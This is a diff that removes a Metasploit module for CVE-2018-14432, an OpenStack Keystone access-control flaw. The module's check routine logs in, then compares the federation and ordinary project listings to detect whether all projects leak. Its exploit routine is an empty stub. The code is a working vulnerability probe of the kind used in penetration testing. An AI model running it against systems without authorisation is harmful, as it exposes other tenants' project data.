--- cve_2018_14432.rb	2019-03-14 07:45:47.652589972 -0400
+++ /usr/share/metasploit-framework/modules/exploits/multi/http/cve_2018_14432.rb	1969-12-31 19:00:00.000000000 -0500
@@ -1,108 +0,0 @@
-require 'msf/core'
-
-class MetasploitModule < Msf::Exploit::Remote
-  Rank = GoodRanking
-
-  include Msf::Exploit::Remote::HttpClient
-
-  def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'CVE-2018-14432',
-      'Description'    => %q{
-      	In the Federation component of OpenStack Keystone before 11.0.4, 
-        12.0.0, and 13.0.0, an authenticated "GET /v3/OS-FEDERATION/projects" 
-        request may bypass intended access restrictions on listing projects. 
-        An authenticated user may discover projects they have no authority to access, 
-        leaking all projects in the deployment and their attributes. 
-        Only Keystone with the /v3/OS-FEDERATION endpoint enabled via policy.json is affected.
-      },
-      'Author'         => 'jason3e7',
-      'References'     =>
-        [
-          [ 'CVE', '2018-14432' ],
-        ],
-      'Platform'       => 'python',
-      'Targets'        =>        
-        [
-          [ 'Automatic', {} ]
-        ],
-      'DefaultTarget' => 0))
-
-    register_options(
-      [
-        OptString.new('TARGETURI', [ false, "Base identity directory path", '/identity/']),
-        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
-        OptString.new('PASSWORD', [ true, "Password to authenticate with", ''])
-      ])
-  end
-
-  def check
-
-    user = {"name" => datastore['USERNAME'], "domain" => {"name" => "Default"}, "password" => datastore['PASSWORD']}
-    data = {"auth" => { "identity" => { "methods" => ["password"], "password" => {"user" => user}}}}
-
-    res = send_request_raw({
-      'uri'	=> normalize_uri(datastore['TARGETURI'], "/v3/auth/tokens"),
-      'method'  => 'POST',
-      'data'    => data.to_json,
-      'headers' =>
-      {
-        'Content-Type'	 => 'application/json'
-      }
-    }, 5)
-    
-    if res.nil?
-      print_error("Connection error")
-      return Exploit::CheckCode::Unknown
-    end
-
-    token = res.headers['X-Subject-Token']
-
-    if token.nil?
-      print_error("Can't get token")
-      return Exploit::CheckCode::Unknown
-    end
-   
-    res_os = send_request_raw({
-      'uri'	  => normalize_uri(datastore['TARGETURI'], "/v3/OS-FEDERATION/projects"),
-      'method'  => 'GET',
-      'headers' => {'X-Auth-Token' => token}
-    })
-
-    res_auth = send_request_raw({
-      'uri'	  => normalize_uri(datastore['TARGETURI'], "/v3/auth/projects"),
-      'method'  => 'GET',
-      'headers' => {'X-Auth-Token' => token}
-    })
-
-    if res_os.code == 500 && res_auth.code == 200
-      print_status("Status code 500")
-      return Exploit::CheckCode::Appears
-    end
-
-    if res_os.code != 200 && res_auth.code != 200
-      print_error("Status code error")
-      return Exploit::CheckCode::Unknown
-    end
-
-    res_os_json = JSON.parse(res_os.body)
-    res_os_json.delete("links")
-    res_auth_json = JSON.parse(res_auth.body)
-    res_auth_json.delete("links")
-
-    if res_os_json == res_auth_json
-      return Exploit::CheckCode::Safe
-    else
-      return Exploit::CheckCode::Vulnerable
-    end
-
-  end
-
-  def exploit
-    fail_with(Failure::None, "Not have exploit")
-
-    handler
-  end
-
-end
-
